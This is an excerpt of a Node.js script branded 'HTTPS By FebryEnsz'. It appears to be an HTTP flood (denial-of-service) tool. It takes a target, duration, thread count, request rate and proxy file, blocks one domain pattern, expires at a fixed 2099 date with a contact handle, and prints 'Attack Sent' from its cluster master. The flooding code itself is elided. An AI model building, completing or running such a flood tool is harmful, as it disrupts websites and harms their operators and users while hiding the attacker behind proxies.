...
const blockedDomain = [".gossssv"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2099-12-1');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error('HTTPS By FebryEnsz');
    console.error(`[FebryEnsz] : mode target port time thread rate proxyFile
    `);
    process.exit(1);
}
...
if (currentDate > targetDate) {
    console.error('Method out of date contact: @sedihbetgw');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain}`);
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.clear()
    console.log('\x1b[36m%s\x1b[0m', 'HTTPS By FebryEnsz');
    console.log('\x1b[36m%s\x1b[0m', 'Attack Sent\n');
    console.log('\x1b[36m%s\x1b[0m', '@f3brylords - @sedihbetgw');
